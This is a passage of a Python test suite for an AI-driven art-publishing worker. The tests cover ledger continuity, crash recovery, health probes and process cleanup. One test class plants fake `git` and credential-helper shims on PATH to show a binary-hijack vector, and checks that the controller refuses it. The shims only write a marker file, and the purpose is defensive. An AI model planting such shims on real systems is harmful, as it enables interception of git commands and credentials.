                         "the cleanup ran a hijacked git helper")
        self.assertNotIn("art/doomed",
                         git_bare(self.origin, "for-each-ref",
                                  "--format=%(refname)"))

    def test_a_full_cycle_survives_a_hostile_environment(self):
        with mock.patch.dict(os.environ, self.hostile), \
             mock.patch.object(EW, "_GIT_ENV", None), \
             mock.patch.object(EW, "run_model", self.model_that_submits()):
            summary = EW.run_once(cfg=self.cfg, health=lambda phase: healthy())
        self.assertEqual(EW.OUTCOME_CONTRIBUTED, summary["outcome"], summary)
        self.assertFalse(self.marker.exists())
        self.assertIn("submissions/new-piece/piece.svg",
                      git_bare(self.origin, "ls-tree", "--name-only", "-r", "main"))

    def test_the_allowlist_is_named_in_the_source_not_a_denylist(self):
        source = (Path(__file__).resolve().parent / "evolve_worker.py").read_text(
            encoding="utf-8")
        self.assertIn("GIT_ENV_ALLOWLIST", source)
        self.assertNotIn("GIT_ENV_STRIP", source,
                         "a denylist has to be complete to be correct")


class FakeGitOnPathTests(WorkerEnv):
    """An absolute, existing directory on PATH holding a fake `git` (#HIGH).

    The previous sanitiser kept any absolute existing directory, and every
    controller call invoked a bare `git` — so a hostile PATH entry chose the
    binary that everything else was busy reasoning about. The fix is to stop
    resolving git through PATH at all.
    """

    def setUp(self):
        super().setUp()
        self.marker = self.home / "FAKE-GIT-RAN"
        self.fakebin = self.home / "fakebin"
        self.fakebin.mkdir()
        fake = self.fakebin / "git"
        fake.write_text(
            f'#!/bin/sh\ntouch "{self.marker}"\nexec /usr/bin/git "$@"\n',
            encoding="utf-8")
        fake.chmod(0o755)
        # the same trick for the helper the credential path would run
        helper = self.fakebin / "git-credential-osxkeychain"
        helper.write_text(f'#!/bin/sh\ntouch "{self.marker}"\nexit 0\n',
                          encoding="utf-8")
        helper.chmod(0o755)
        self.hostile_path = {"PATH": f"{self.fakebin}:/usr/bin:/bin"}
        self.wcfg = dict(EW.worker_config({}), repo=str(self.origin))

    def fresh(self):
        return mock.patch.object(EW, "_GIT_ENV", None)

    # ── the vector, proved to work without the controller ──
    def test_the_fake_git_wins_for_a_naive_caller(self):
        proc = subprocess.run(["git", "--version"], capture_output=True,
                              text=True, env={**os.environ, **self.hostile_path})
        self.assertEqual(0, proc.returncode)
        self.assertTrue(self.marker.exists(),
                        "the repro is broken if a bare `git` does not pick up "
                        "the fake binary")

    # ── and cannot win anywhere in the controller ──
    def test_credential_helper_discovery_uses_the_pinned_binary(self):
        with mock.patch.dict(os.environ, self.hostile_path), self.fresh():
            EW._credential_helper()
        self.assertFalse(self.marker.exists(),
                         "the credential helper read ran a fake git")

    def test_initial_acquisition_uses_the_pinned_binary(self):
        clone = self.home / "clone"
        with mock.patch.dict(os.environ, self.hostile_path), self.fresh():
            head = EW._clone_repo(self.wcfg, clone)
        self.assertFalse(self.marker.exists(), "the clone ran a fake git")
        self.assertEqual(git_bare(self.origin, "rev-parse", "main").strip(), head)

    def test_a_full_cycle_uses_the_pinned_binary(self):
        with mock.patch.dict(os.environ, self.hostile_path), self.fresh(), \
             mock.patch.object(EW, "run_model", self.model_that_submits()):
            summary = EW.run_once(cfg=self.cfg, health=lambda phase: healthy())
        self.assertEqual(EW.OUTCOME_CONTRIBUTED, summary["outcome"], summary)
        self.assertFalse(self.marker.exists(), "the cycle ran a fake git")

    def test_cleanup_uses_the_pinned_binary(self):
        clone = self.home / "clone-cleanup"
        with self.fresh():
            EW._clone_repo(self.wcfg, clone)
        git(clone, "config", "user.email", "t@example.com")
        git(clone, "config", "user.name", "t")
        git(clone, "checkout", "-q", "-b", "art/doomed")
        (clone / "x.txt").write_text("x", encoding="utf-8")
        git(clone, "add", "-A")
        git(clone, "commit", "-qm", "doomed")
        git(clone, "push", "-q", "-u", "origin", "art/doomed")
        git(clone, "config", "remote.origin.pushurl", str(self.home / "x.git"))

        with mock.patch.dict(os.environ, self.hostile_path), self.fresh():
            self.assertTrue(EW._delete_remote_branch(clone, "art/doomed",
                                                     self.wcfg))
        self.assertFalse(self.marker.exists(), "the cleanup ran a fake git")
        self.assertNotIn("art/doomed",
                         git_bare(self.origin, "for-each-ref",
                                  "--format=%(refname)"))

    # ── the pin itself ──
    def test_the_pinned_binary_is_absolute_and_trusted(self):
        with mock.patch.dict(os.environ, self.hostile_path):
            binary = EW.git_binary()
        self.assertTrue(binary.startswith(("/usr/bin/", "/bin/")), binary)
        self.assertNotIn(str(self.fakebin), binary)

    def test_the_path_handed_to_git_inherits_nothing(self):
        with mock.patch.dict(os.environ, self.hostile_path), self.fresh():
            env = EW.controller_git_env()
        self.assertNotIn(str(self.fakebin), env["PATH"])
        self.assertEqual(list(EW.TRUSTED_PATH_DIRS), env["PATH"].split(os.pathsep))

    def test_a_configured_binary_outside_a_trusted_root_is_refused(self):
        with self.assertRaises(EW.GateError) as cm:
            EW.git_binary({"git_binary": str(self.fakebin / "git")})
        self.assertIn("trusted root", str(cm.exception))

    def test_a_symlink_from_a_trusted_root_to_an_untrusted_target_is_refused(self):
        link = self.home / "link-git"
        link.symlink_to(self.fakebin / "git")
        with self.assertRaises(EW.GateError):
            EW.git_binary({"git_binary": str(link)})

    def test_a_non_executable_or_writable_binary_is_refused(self):
        plain = self.home / "plain"
        plain.write_text("#!/bin/sh\n", encoding="utf-8")
        with self.assertRaises(EW.GateError):
            EW.git_binary({"git_binary": str(plain),
                           "trusted_bin_roots": [str(self.home)]})
        plain.chmod(0o777)
        with self.assertRaises(EW.GateError) as cm:
            EW.git_binary({"git_binary": str(plain),
                           "trusted_bin_roots": [str(self.home)]})
        self.assertIn("writable", str(cm.exception))

    def test_a_configured_trusted_binary_is_accepted(self):
        self.assertEqual("/usr/bin/git",
                         EW.git_binary({"git_binary": "/usr/bin/git"}))

    def test_gh_is_validated_too(self):
        # gh may live in a package-manager prefix, so the rule is "absolute,
        # regular, executable, not writable by anybody else" rather than a
        # system root — but it is still a rule.
        with self.assertRaises(EW.GateError) as cm:
            EW.gh_binary({"gh_binary": "gh"})
        self.assertIn("absolute", str(cm.exception))

        loose = self.home / "loose-gh"
        loose.write_text("#!/bin/sh\n", encoding="utf-8")
        loose.chmod(0o777)
        with self.assertRaises(EW.GateError) as cm:
            EW.gh_binary({"gh_binary": str(loose)})
        self.assertIn("writable", str(cm.exception))

        loose.chmod(0o755)
        self.assertEqual(str(loose.resolve()),
                         EW.gh_binary({"gh_binary": str(loose)}))

    def test_no_bare_git_or_gh_invocation_survives_in_the_source(self):
        source = (Path(__file__).resolve().parent / "evolve_worker.py").read_text(
            encoding="utf-8")
        self.assertNotIn('subprocess.run(["git"', source,
                         "git must be invoked through the pinned binary")
        self.assertNotIn('subprocess.run(["gh"', source,
                         "gh must be invoked through the resolved binary")


LIVE_LEGACY_STATE = {
    "cycles": [
        {"cycle": 1, "slug": "first-heartbeat-ii",
         "title": "First Heartbeat II", "at": "2026-08-17T20:11:00+00:00"},
    ],
    "last_cycle": 1,
}


class CreativeContinuityTests(unittest.TestCase):
    """The live instance's own state, read without guessing (#2)."""

    def test_the_exact_live_state_says_the_next_cycle_is_two(self):
        self.assertEqual((2, "first-heartbeat-ii"),
                         EW.next_creative_cycle(LIVE_LEGACY_STATE))

    def test_a_fresh_instance_starts_at_one(self):
        self.assertEqual((1, None), EW.next_creative_cycle({}))

    def test_the_worker_schema_still_reads_the_same_way(self):
        self.assertEqual((4, "third-thing"),
                         EW.next_creative_cycle({"cycle": 3,
                                                 "last_slug": "third-thing"}))

    def test_cycles_alone_are_enough(self):
        state = {"cycles": [{"cycle": 1, "slug": "a"}, {"cycle": 2, "slug": "b"}]}
        self.assertEqual((3, "b"), EW.next_creative_cycle(state))

    def test_last_slug_wins_over_the_history_list(self):
        state = dict(LIVE_LEGACY_STATE, last_slug="explicit")
        self.assertEqual((2, "explicit"), EW.next_creative_cycle(state))

    # ── inconsistency fails closed ──
    def test_cycle_and_last_cycle_disagreeing_fails_closed(self):
        with self.assertRaises(EW.LedgerError) as cm:
            EW.next_creative_cycle({"cycle": 1, "last_cycle": 5})
        self.assertIn("disagrees with itself", str(cm.exception))

    def test_a_history_ahead_of_the_counter_fails_closed(self):
        with self.assertRaises(EW.LedgerError) as cm:
            EW.next_creative_cycle({"last_cycle": 1,
                                    "cycles": [{"cycle": 1}, {"cycle": 2}]})
        self.assertIn("reaches 2", str(cm.exception))

    def test_a_gapped_history_fails_closed(self):
        with self.assertRaises(EW.LedgerError) as cm:
            EW.next_creative_cycle({"cycles": [{"cycle": 1}, {"cycle": 3}]})
        self.assertIn("not 1..N", str(cm.exception))

    def test_nonsense_types_fail_closed(self):
        for state in ({"cycle": "two"}, {"last_cycle": -1}, {"cycles": "many"},
                      {"cycles": [{"cycle": 0}]}, {"cycles": ["nope"]},
                      {"cycle": True}, {"last_slug": 7, "cycle": 1}):
            with self.subTest(state=state):
                with self.assertRaises(EW.LedgerError):
                    EW.next_creative_cycle(state)

    def test_an_empty_shell_of_a_state_fails_closed(self):
        with self.assertRaises(EW.LedgerError) as cm:
            EW.next_creative_cycle({"notes": "nothing else"})
        self.assertIn("no cycle", str(cm.exception))

    # ── writing preserves the legacy history ──
    def test_merging_keeps_the_legacy_cycles_and_adds_the_new_one(self):
        merged = EW.merge_creative_state(
            LIVE_LEGACY_STATE, {"notes": "learned things"}, 2, "second-thing",
            {"merge_commit": "abc123", "pr_url": "https://example/pr/2"})
        self.assertEqual([1, 2], [c["cycle"] for c in merged["cycles"]])
        self.assertEqual("first-heartbeat-ii", merged["cycles"][0]["slug"])
        self.assertEqual("second-thing", merged["cycles"][1]["slug"])
        self.assertEqual("abc123", merged["cycles"][1]["merge_commit"])
        self.assertEqual(2, merged["cycle"])
        self.assertEqual(2, merged["last_cycle"])
        self.assertEqual("second-thing", merged["last_slug"])
        self.assertEqual("learned things", merged["notes"])

    def test_the_merged_state_reads_back_as_the_next_cycle(self):
        merged = EW.merge_creative_state(LIVE_LEGACY_STATE, {}, 2, "second",
                                         {"merge_commit": "x"})
        self.assertEqual((3, "second"), EW.next_creative_cycle(merged))

    def test_a_replayed_cycle_number_does_not_duplicate_history(self):
        merged = EW.merge_creative_state(LIVE_LEGACY_STATE, {}, 1, "redone",
                                         {"merge_commit": "x"})
        self.assertEqual([1], [c["cycle"] for c in merged["cycles"]])
        self.assertEqual("redone", merged["cycles"][0]["slug"])

    def test_history_is_bounded(self):
        state = {"cycles": [{"cycle": i, "slug": f"s{i}"} for i in range(1, 61)],
                 "last_cycle": 60}
        merged = EW.merge_creative_state(state, {}, 61, "new", {})
        self.assertEqual(50, len(merged["cycles"]))
        self.assertEqual(61, merged["cycles"][-1]["cycle"])


class LiveRetryTests(WorkerEnv):
    """The rejected live attempt was a failed spend, not a public cycle (#3)."""

    def setUp(self):
        super().setUp()
        (self.state / "evolve-creative-state.json").write_text(
            json.dumps(LIVE_LEGACY_STATE), encoding="utf-8")
        # the commons already holds cycle 1's piece
        seed = self.home / "seed2"
        subprocess.run(["git", "clone", str(self.origin), str(seed)],
                       check=True, capture_output=True)
        git(seed, "config", "user.email", "t@example.com")
        git(seed, "config", "user.name", "t")
        write_submission(seed, "first-heartbeat-ii",
                         meta_for("first-heartbeat-ii"))
        git(seed, "add", "-A")
        git(seed, "commit", "-qm", "cycle 1")
        git(seed, "push", "-q", "origin", "main")

    def test_the_retry_after_a_rejected_attempt_is_cycle_two(self):
        # a rejected cycle: the maker leaves a hidden probe and nothing else
        def fumbling(staging, prompt, wcfg, depth=0, runtime=None):
            (Path(staging) / "out" / EW.SUBMISSION_DIR / ".probe").write_text(
                "", encoding="utf-8")
            return "ok", "SENTINEL_RESULT: CONTRIBUTED\n"
        with mock.patch.object(EW, "run_model", fumbling):
            first = EW.run_once(cfg=self.cfg, health=lambda phase: healthy())
        self.assertEqual(EW.OUTCOME_REJECTED, first["outcome"])

        state = json.loads(
            (self.state / "evolve-creative-state.json").read_text())
        self.assertEqual(LIVE_LEGACY_STATE, state,
                         "a failed spend must not touch public continuity")

        seen = {}

        def maker(staging, prompt, wcfg, depth=0, runtime=None):
            seen["prompt"] = prompt
            write_submission(Path(staging) / "out", "second-piece",
                             meta_for("second-piece", cycle=2,
                                      previous="first-heartbeat-ii"))
            (Path(staging) / "state-out.json").write_text(json.dumps(
                {"cycle": 2, "last_slug": "second-piece", "notes": "n"}),
                encoding="utf-8")
            return "ok", "SENTINEL_RESULT: CONTRIBUTED\n"

        with mock.patch.object(EW, "run_model", maker):
            second = EW.run_once(cfg=self.cfg, health=lambda phase: healthy())

        self.assertEqual(EW.OUTCOME_CONTRIBUTED, second["outcome"], second)
        self.assertIn('"cycle" MUST be exactly 2', seen["prompt"])
        self.assertIn("first-heartbeat-ii", seen["prompt"])
        merged = json.loads(
            (self.state / "evolve-creative-state.json").read_text())
        self.assertEqual(2, merged["cycle"])
        self.assertEqual("second-piece", merged["last_slug"])
        self.assertEqual([1, 2], [c["cycle"] for c in merged["cycles"]],
                         "the legacy history survived the write")

    def test_a_cycle_one_retry_against_the_live_state_is_rejected(self):
        def stale(staging, prompt, wcfg, depth=0, runtime=None):
            write_submission(Path(staging) / "out", "another-first",
                             meta_for("another-first", cycle=1, previous=None))
            (Path(staging) / "state-out.json").write_text(json.dumps(
                {"cycle": 1, "last_slug": "another-first"}), encoding="utf-8")
            return "ok", "SENTINEL_RESULT: CONTRIBUTED\n"
        with mock.patch.object(EW, "run_model", stale):
            summary = EW.run_once(cfg=self.cfg, health=lambda phase: healthy())
        self.assertEqual(EW.OUTCOME_REJECTED, summary["outcome"])
        self.assertIn("continuity", summary["detail"])

    def test_an_inconsistent_state_stops_the_pass_before_any_model(self):
        (self.state / "evolve-creative-state.json").write_text(
            json.dumps({"cycle": 1, "last_cycle": 9}), encoding="utf-8")
        with mock.patch.object(EW, "run_model") as maker:
            summary = EW.run_once(cfg=self.cfg, health=lambda phase: healthy())
        self.assertEqual("fail-closed", summary["outcome"])
        maker.assert_not_called()

    def test_reconciliation_writes_the_migrated_shape(self):
        real_publish = EW.publish

        def dying(clone, submission, wcfg, health, branch=None, transaction=None):
            def note(**fields):
                state = transaction(**fields) if transaction else {}
                if fields.get("phase") == "merged":
                    raise KeyboardInterrupt("power cut")
                return state
            return real_publish(clone, submission, wcfg, health, branch, note)

        def maker(staging, prompt, wcfg, depth=0, runtime=None):
            write_submission(Path(staging) / "out", "second-piece",
                             meta_for("second-piece", cycle=2,
                                      previous="first-heartbeat-ii"))
            (Path(staging) / "state-out.json").write_text(json.dumps(
                {"cycle": 2, "last_slug": "second-piece"}), encoding="utf-8")
            return "ok", "SENTINEL_RESULT: CONTRIBUTED\n"

        with mock.patch.object(EW, "run_model", maker), \
             mock.patch.object(EW, "publish", dying):
            EW.run_once(cfg=self.cfg, health=lambda phase: healthy())
        with mock.patch.object(EW, "run_model") as unused:
            healed = EW.run_once(cfg=self.cfg, health=lambda phase: healthy())
        unused.assert_not_called()
        self.assertEqual("reconciled-contributed", healed["outcome"], healed)

        merged = json.loads(
            (self.state / "evolve-creative-state.json").read_text())
        self.assertEqual(2, merged["cycle"])
        self.assertEqual([1, 2], [c["cycle"] for c in merged["cycles"]])
        self.assertEqual((3, "second-piece"), EW.next_creative_cycle(merged))


class LifecycleTests(WorkerEnv):
    """A stopped worker leaves nothing running (#4)."""

    def test_sigterm_kills_the_whole_tree_and_frees_the_lock(self):
        repo_root = Path(__file__).resolve().parent
        marker = self.home / "grandchild.pid"
        shim_dir = self.home / "bin"
        shim_dir.mkdir()
        shim = shim_dir / "copilot"
        # The marker is written atomically: a half-created file is exactly
        # the empty-string read that made this test flake under load.
        shim.write_text(
            "#!/usr/bin/env bash\n"
            f"{sys.executable} -c \"import os,subprocess,sys,time;"
            "p=subprocess.Popen([sys.executable,'-c','import time;time.sleep(120)']);"
            f"tmp={str(marker) + '.tmp'!r};"
            "open(tmp,'w').write(str(p.pid));"
            f"os.replace(tmp,{str(marker)!r});time.sleep(120)\"\n",
            encoding="utf-8")
        shim.chmod(0o755)

        cfg = dict(self.cfg, notify=False)
        cfg["evolve_worker"] = {**cfg["evolve_worker"],
                                "fanout": {"enabled": False,
                                           "isolated_home": False}}
        (self.home / "cfg.json").write_text(json.dumps(cfg), encoding="utf-8")
        driver = self.home / "driver.py"
        driver.write_text(
            "import json, sys\n"
            f"sys.path.insert(0, {str(repo_root)!r})\n"
            "import evolve_worker as EW\n"
            "EW.install_signal_handlers()\n"
            f"cfg = json.load(open({str(self.home / 'cfg.json')!r}))\n"
            "healthy = {'status': 'healthy', 'failed': [], 'critical': [],\n"
            "           'checks': [], 'summary': 'ok'}\n"
            "print(json.dumps(EW.run_once(cfg=cfg, health=lambda p: healthy)))\n",
            encoding="utf-8")

        env = dict(os.environ)
        env["SENTINEL_HOME"] = str(self.home)
        env["PATH"] = f"{shim_dir}:{env['PATH']}"
        proc = subprocess.Popen([sys.executable, str(driver)], env=env,
                                stdout=subprocess.PIPE, stderr=subprocess.PIPE,
                                text=True, start_new_session=True)
        self.addCleanup(_reap_tree, proc)

        # Generous waits: this test is about what SURVIVES a SIGTERM, not
        # about how fast a loaded machine gets there. A tight deadline here
        # only ever measures the test runner.
        deadline = time.monotonic() + 120
        while time.monotonic() < deadline and not marker.exists():
            time.sleep(0.1)
        self.assertTrue(marker.exists(), "the fake maker never started")
        grandchild = int(marker.read_text())

        proc.send_signal(signal.SIGTERM)
        try:
            out, err = proc.communicate(timeout=180)
        except subprocess.TimeoutExpired:
            proc.kill()
            out, err = proc.communicate()
            self.fail("the worker did not exit after SIGTERM")

        self.assertTrue(_dead(grandchild),
                        "a model's grandchild outlived the worker's SIGTERM")
        self.assertTrue(_dead(proc.pid))

        workspaces = self.home / "state" / "evolve-workspaces"
        self.assertEqual([], list(workspaces.iterdir()) if workspaces.exists() else [],
                         "the workspace must be removed on the way out")

        status_file = self.home / "state" / "evolve-worker-status.json"
        deadline = time.monotonic() + 15
        while time.monotonic() < deadline and not status_file.exists():
            time.sleep(0.1)
        status = json.loads(status_file.read_text())
        self.assertEqual("interrupted", status["outcome"], status)

        # The lock is only free once the tree is gone — which it now is.
        lock = EW.acquire_lock(self.home / "state" / "evolve-worker.lock")
        self.addCleanup(EW.release_lock, lock)
        self.assertIsNotNone(lock, "the lock outlived the pass")

    def test_the_lock_is_still_held_while_a_model_is_alive(self):
        released = []
        real_release = EW.release_lock

        def watched(fd):
            released.append(EW.live_processes())
            return real_release(fd)

        def slow_maker(staging, prompt, wcfg, depth=0, runtime=None):
            proc = subprocess.Popen(
                [sys.executable, "-c", "import time; time.sleep(30)"],
                start_new_session=True)
            EW.track(proc)
            return EW.OUTCOME_FAILED, "left something running"

        with mock.patch.object(EW, "run_model", slow_maker), \
             mock.patch.object(EW, "release_lock", watched):
            EW.run_once(cfg=self.cfg, health=lambda phase: healthy())

        self.assertEqual([[]], released,
                         "nothing may still be running when the lock is dropped")

    def test_kill_tracked_reports_what_it_had_to_kill(self):
        proc = subprocess.Popen([sys.executable, "-c", "import time; time.sleep(30)"],
                                start_new_session=True)
        EW.track(proc)
        self.assertEqual(1, EW.kill_tracked())
        self.assertTrue(_dead(proc.pid))
        self.assertEqual([], EW.live_processes())


class ReconciliationTests(WorkerEnv):
    """The crash window between `gh pr merge` and the ledger write (#5)."""

    def crash_after(self, phase):
        """A publish that dies right after `phase` was recorded."""
        real_publish = EW.publish

        def dying(clone, submission, wcfg, health, branch=None, transaction=None):
            def note(**fields):
                state = transaction(**fields) if transaction else {}
                if fields.get("phase") == phase:
                    raise KeyboardInterrupt("power cut")
                return state
            return real_publish(clone, submission, wcfg, health, branch, note)
        return dying

    def test_a_merge_that_was_never_recorded_is_finished_on_the_next_pass(self):
        with mock.patch.object(EW, "run_model", self.model_that_submits()), \
             mock.patch.object(EW, "publish", self.crash_after("merged")):
            first = EW.run_once(cfg=self.cfg, health=lambda phase: healthy())
        self.assertEqual("interrupted", first["outcome"], first)

        # The art IS public: the merge happened before the interruption.
        self.assertIn("submissions/new-piece/piece.svg",
                      git_bare(self.origin, "ls-tree", "--name-only", "-r", "main"))
        history = json.loads(EW.HISTORY_PATH.read_text())
        self.assertEqual("pending", history[0]["outcome"])
        self.assertTrue(EW.TRANSACTION_PATH.exists())
        self.assertEqual([], self.texts(), "nothing was announced yet")

        with mock.patch.object(EW, "run_model") as maker:
            second = EW.run_once(cfg=self.cfg, health=lambda phase: healthy())

        self.assertEqual("reconciled-contributed", second["outcome"], second)
        maker.assert_not_called()
        history = json.loads(EW.HISTORY_PATH.read_text())
        self.assertEqual(1, len(history), "reconciling is not a second cycle")
        self.assertEqual(EW.OUTCOME_CONTRIBUTED, history[0]["outcome"])
        state = json.loads((self.state / "evolve-creative-state.json").read_text())
        self.assertEqual("new-piece", state["last_slug"])
        self.assertEqual(1, len(self.notifications), "exactly one message")
        self.assertIn(EW.SUCCESS_PREFIX, self.texts()[0])
        self.assertFalse(EW.TRANSACTION_PATH.exists())

    def test_an_abandoned_pr_is_closed_and_the_row_marked_aborted(self):
        with mock.patch.object(EW, "run_model", self.model_that_submits()), \
             mock.patch.object(EW, "publish", self.crash_after("pr-open")):
            first = EW.run_once(cfg=self.cfg, health=lambda phase: healthy())
        self.assertEqual("interrupted", first["outcome"])
        self.assertTrue(EW.TRANSACTION_PATH.exists())

        with mock.patch.object(EW, "run_model") as maker:
            second = EW.run_once(cfg=self.cfg, health=lambda phase: healthy())
        self.assertEqual("reconciled-aborted", second["outcome"], second)
        maker.assert_not_called()
        self.assertTrue(self.gh.called("pr", "close"))
        history = json.loads(EW.HISTORY_PATH.read_text())
        self.assertEqual(EW.OUTCOME_ABORTED, history[0]["outcome"])
        self.assertFalse(any(EW.SUCCESS_PREFIX in n for n in self.texts()))
        self.assertFalse((self.state / "evolve-creative-state.json").exists())
        self.assertFalse(EW.TRANSACTION_PATH.exists())

    def test_a_death_before_any_pr_is_recorded_as_aborted(self):
        with mock.patch.object(EW, "run_model", self.model_that_submits()), \
             mock.patch.object(EW, "publish", self.crash_after("committed")):
            EW.run_once(cfg=self.cfg, health=lambda phase: healthy())
        with mock.patch.object(EW, "run_model") as maker:
            second = EW.run_once(cfg=self.cfg, health=lambda phase: healthy())
        self.assertEqual("reconciled-aborted", second["outcome"])
        maker.assert_not_called()
        history = json.loads(EW.HISTORY_PATH.read_text())
        self.assertEqual(EW.OUTCOME_ABORTED, history[0]["outcome"])

    def test_the_next_cycle_number_follows_the_reconciled_ledger(self):
        with mock.patch.object(EW, "run_model", self.model_that_submits()), \
             mock.patch.object(EW, "publish", self.crash_after("merged")):
            EW.run_once(cfg=self.cfg, health=lambda phase: healthy())
        EW.run_once(cfg=self.cfg, health=lambda phase: healthy())
        with mock.patch.object(EW, "run_model",
                               self.model_that_submits(slug="second-piece",
                                                       cycle=2,
                                                       previous="new-piece")):
            third = EW.run_once(cfg=self.cfg, health=lambda phase: healthy())
        self.assertEqual(EW.OUTCOME_CONTRIBUTED, third["outcome"], third)


class HealthProbeTests(WorkerEnv):
    """A probe that cannot answer is not an answer (#5, #8)."""

    def test_a_raising_probe_before_the_merge_blocks_and_cleans_up(self):
        def health(phase):
            if phase == "pre-merge":
                raise RuntimeError("health.py exploded")
            return healthy()
        with mock.patch.object(EW, "run_model", self.model_that_submits()):
            summary = EW.run_once(cfg=self.cfg, health=health)
        self.assertEqual(EW.OUTCOME_ABORTED, summary["outcome"])
        self.assertIn("RuntimeError", summary["detail"])
        self.assertFalse(self.gh.called("pr", "merge"))
        self.assertTrue(self.gh.called("pr", "close"))

    def test_a_malformed_verdict_before_the_merge_blocks(self):
        def health(phase):
            return healthy() if phase != "pre-merge" else {"status": "healthy"}
        with mock.patch.object(EW, "run_model", self.model_that_submits()):
            summary = EW.run_once(cfg=self.cfg, health=health)
        self.assertEqual(EW.OUTCOME_ABORTED, summary["outcome"])
        self.assertIn("missing", summary["detail"])
        self.assertFalse(self.gh.called("pr", "merge"))

    def test_a_raising_probe_at_the_start_never_spends_a_model(self):
        def health(phase):
            raise TimeoutError("no answer")
        with mock.patch.object(EW, "run_model") as maker:
            summary = EW.run_once(cfg=self.cfg, health=health)
        self.assertEqual("skipped", summary["outcome"])
        self.assertIn("TimeoutError", summary["reason"])
        maker.assert_not_called()


class ViewProbeTests(WorkerEnv):
    """Never text a triumphant 404 (#10)."""

    def test_a_live_pages_url_is_used(self):
        with mock.patch.object(EW, "run_model", self.model_that_submits()):
            EW.run_once(cfg=self.cfg, health=lambda phase: healthy())
        text = self.texts()[0]
        self.assertIn("View: https://kody-w.github.io/", text)
        self.assertTrue(self.probes, "the url was probed before it was sent")

    def test_pages_lagging_falls_back_to_the_verified_raw_url(self):
        self.probe_answer = lambda url: "raw.githubusercontent.com" in url
        with mock.patch.object(EW, "run_model", self.model_that_submits()):
            EW.run_once(cfg=self.cfg, health=lambda phase: healthy())
        text = self.texts()[0]
        self.assertIn("View: https://raw.githubusercontent.com/", text)
        self.assertIn("Pages has not published it yet", text)
        self.assertNotIn("View: https://kody-w.github.io/", text)

    def test_nothing_answering_says_so_instead_of_linking_a_404(self):
        self.probe_answer = lambda url: False
        with mock.patch.object(EW, "run_model", self.model_that_submits()):
            summary = EW.run_once(cfg=self.cfg, health=lambda phase: healthy())
        self.assertEqual(EW.OUTCOME_CONTRIBUTED, summary["outcome"])
        text = self.texts()[0]
        self.assertNotIn("View:", text)
        self.assertIn("no public URL answered yet", text)
        self.assertIn("Source:", text, "the evidence links still go out")

    def test_the_probe_retries_before_giving_up(self):
        answers = iter([False, False, True])
        self.probe_answer = lambda url: ("github.io" in url
                                         and next(answers, True))
        with mock.patch.object(EW, "run_model", self.model_that_submits()):
            EW.run_once(cfg=self.cfg, health=lambda phase: healthy())
        self.assertGreater(len(self.probes), 2, "it retried")
        self.assertIn("View: https://kody-w.github.io/", self.texts()[0])

    def test_the_probed_url_is_recorded_in_the_ledger(self):
        with mock.patch.object(EW, "run_model", self.model_that_submits()):
            EW.run_once(cfg=self.cfg, health=lambda phase: healthy())
        row = json.loads(EW.HISTORY_PATH.read_text())[0]
        self.assertEqual("pages", row["view_kind"])
        self.assertTrue(row["view_url"].startswith("https://kody-w.github.io/"))


class HeartbeatTests(WorkerEnv):
    """Enabled-but-not-running must not look like 'nothing to make' (#6)."""

    def test_every_pass_writes_a_heartbeat(self):
        with mock.patch.object(EW, "run_model", self.model_that_submits()):
            EW.run_once(cfg=self.cfg, health=lambda phase: healthy())
        status = json.loads(EW.STATUS_PATH.read_text())
        self.assertEqual(EW.OUTCOME_CONTRIBUTED, status["outcome"])
        self.assertEqual("openrappter", status["role"])
        self.assertEqual(os.getpid(), status["pid"])

    def test_a_skip_writes_a_heartbeat_too(self):
        EW.run_once(cfg=self.cfg, health=lambda phase: critical("rb_workflows"))
        status = json.loads(EW.STATUS_PATH.read_text())
        self.assertEqual("skipped", status["outcome"])
        self.assertIn("rb_workflows", status["reason"])

    def test_a_failure_writes_a_heartbeat_too(self):
        with mock.patch.object(EW, "run_model",
                               lambda *a, **k: (EW.OUTCOME_TIMEOUT, "timed out")):
            EW.run_once(cfg=self.cfg, health=lambda phase: healthy())
        status = json.loads(EW.STATUS_PATH.read_text())
        self.assertEqual(EW.OUTCOME_TIMEOUT, status["outcome"])


def _dead(pid, timeout=10):
    deadline = time.monotonic() + timeout
    while time.monotonic() < deadline:
        try:
            os.kill(pid, 0)
        except ProcessLookupError:
            return True
        except PermissionError:
            return False
        time.sleep(0.05)
    return False


def _reap_tree(proc):
    try:
        os.killpg(os.getpgid(proc.pid), signal.SIGKILL)
    except (ProcessLookupError, PermissionError):
        pass
    try:
        proc.wait(timeout=5)
    except Exception:
        pass


class ChildDebitTests(WorkerEnv):
    """Spend recorded before it happens, so a crash cannot refund it (#9)."""

    def setUp(self):
        super().setUp()
        self.cfg = worker_cfg(evolve_worker={
            "repo": str(self.origin),
            "fanout": {"enabled": True, "children": 3}})

    def test_the_debit_lands_before_the_children_are_spawned(self):
        seen = {}

        def spy(*args, **kwargs):
            rows = json.loads(EW.HISTORY_PATH.read_text())
            seen["children_at_spawn"] = rows[0]["children"]
            return [child_result("a"), child_result("b"),
                    child_result("adversarial-verifier", wave=2)]

        with mock.patch.object(EW.SS, "run_children", spy), \
             mock.patch.object(EW, "run_model",
                               FanoutIntegrationTests.maker_using_finalists(self)):
            EW.run_once(cfg=self.cfg, health=lambda phase: healthy())
        self.assertEqual(3, seen["children_at_spawn"],
                         "the ledger is debited before the processes start")

    def test_a_raised_future_cannot_erase_the_debit(self):
        def exploding(*args, **kwargs):
            raise RuntimeError("a wave died badly")
        with mock.patch.object(EW.SS, "run_children", exploding), \
             mock.patch.object(EW, "run_model") as maker:
            summary = EW.run_once(cfg=self.cfg, health=lambda phase: healthy())
        self.assertEqual("crashed", summary["outcome"])
        maker.assert_not_called()
        row = json.loads(EW.HISTORY_PATH.read_text())[0]
        self.assertEqual(3, row["children"], "spent credit stays spent")
        self.assertEqual(3, SS.children_spent([row]))

    def test_an_interrupted_fanout_keeps_its_debit(self):
        def interrupted(*args, **kwargs):
            raise KeyboardInterrupt("SIGTERM")
        with mock.patch.object(EW.SS, "run_children", interrupted):
            summary = EW.run_once(cfg=self.cfg, health=lambda phase: healthy())
        self.assertEqual("interrupted", summary["outcome"])
        row = json.loads(EW.HISTORY_PATH.read_text())[0]
        self.assertEqual(3, row["children"])

    def test_the_next_pass_sees_yesterdays_children(self):
        with mock.patch.object(EW.SS, "run_children",
                               return_value=[child_result("a"), child_result("b"),
                                             child_result("adversarial-verifier",
                                                          wave=2)]), \
             mock.patch.object(EW, "run_model",
                               FanoutIntegrationTests.maker_using_finalists(self)):
            EW.run_once(cfg=self.cfg, health=lambda phase: healthy())
        history = json.loads(EW.HISTORY_PATH.read_text())
        cfg = SS.fanout_config(EW.worker_config(self.cfg))
